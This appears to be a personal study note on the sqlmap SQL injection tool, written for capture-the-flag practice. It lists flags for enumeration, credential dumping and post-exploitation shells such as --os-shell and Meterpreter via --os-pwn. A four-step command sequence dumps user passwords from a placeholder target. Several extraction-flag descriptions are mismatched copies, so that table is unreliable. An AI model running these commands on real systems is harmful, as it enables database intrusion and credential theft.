---
tags:
  - 🛠️
up:
  - "[[02 - (incomplete) Data Exfiltration]]"
  - "[[02 - Remote Code Execution]]"
aliases: [sqlmap]
creation_date: 2026-02-08
last_modified: 2026-02-08
---
# 🛠️ [[SQLmap]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - (incomplete) Data Exfiltration]], [[02 - Remote Code Execution]], [[02 - Enumeration]], [[02 - (incomplete) Privilege Escalation]]

## Installation
```bash
sudo apt update
sudo apt install sqlmap
````

## Common Flags

### Command Flags
|**Flag**|**Description**|
|---|---|
|`-u`|The target URL (e.g., `http://target.com/page.php?id=1`).|
|`-r`|Load an HTTP request from a file.|
|`--data`|Data string to be sent via POST (e.g., `user=admin&pass=123`).|
|`--cookie`|Provide a session cookie for authenticated pages (e.g. `name1=value1; name2=value2`).|
|`--batch`|Never ask questions (Like `do you want...`) and choose the default answers.|
|`--level`|Level of tests to perform (1-5, default is 1). Use 5 for deep testing.|
|`--risk`|Risk of tests to perform (1-3, default is 1). 3 can be destructive.|
|`--tamper`|Use a script to bypass WAFs (stored in `/usr/share/sqlmap/tamper/`).|

### Discovery Flags
|**Flag**|**Description**|
|---|---|
|**`--banner`**|Retrieves the DB version and system information (OS, version).|
|**`--current-user`**|Shows the username the DB is running as.|
|**`--current-db`**|Shows the name of the database the website is currently using.|
|**`--is-dba`**|Checks if the current user has admin/root privileges (critical for `--os-shell`).|
|**`--dbs`**|Lists **all** databases accessible by the current user.|
|**`--users`**|Lists all database management system users.|
|**`--passwords`**|Attempts to find and crack the password hashes for the DB users.|

### Selection Flags
|**Flag**|**Logic**|**Example**|
|---|---|---|
|**`-D`**|Specifies the **Database** name.|`-D public_data`|
|**`-T`**|Specifies the **Table** name.|`-T users`|
|**`-C`**|Specifies the **Column** name(s).|`-C "username, password"`|

### Extraction Flags
|**Flag**|**Logic**|**Example**|
|---|---|---|
|**`--tables`**|Specifies the **Database** name.|
|**`--collumns`**|Specifies the **Table** name.|
|**`--dump`**|Specifies the **Column** name(s).|
|**`--schema`**|Dumps the structure of the database (column types, table names) without the actual data|

### Post-Exploitation Flags
|**Flag**|**Description**|
|---|---|
|**`--os-shell`**|**The Holy Grail.** Attempts to give you an interactive terminal on the server. sqlmap will upload a small "backdoor" (PHP, ASP, or JSP) to the webroot to facilitate this.|
|**`--os-cmd=[CMD]`**|Executes a single command on the host OS (e.g., `--os-cmd="whoami"`).|
|**`--os-pwn`**|Attempts to spawn an out-of-band shell, like a **Meterpreter** session, using Metasploit.|
| **`--priv-esc`**|Attempts a database process user privilege escalation. It uses various known exploits to try and bump your session up to admin level.|

## Common Commands
```bash
# Step 1: Find the database names
sqlmap -u "http://target.com/id=1" --dbs

# Step 2: Find tables in the 'webapp' database
sqlmap -u "http://target.com/id=1" -D webapp --tables

# Step 3: Find columns in the 'users' table
sqlmap -u "http://target.com/id=1" -D webapp -T users --columns

# Step 4: Dump the usernames and passwords
sqlmap -u "http://target.com/id=1" -D webapp -T users -C "user,pass" --dump
```

## Related Usage

### CTFs
[[BKSEC - Low Effort SNS]]
[[BKSEC - Ezzz]]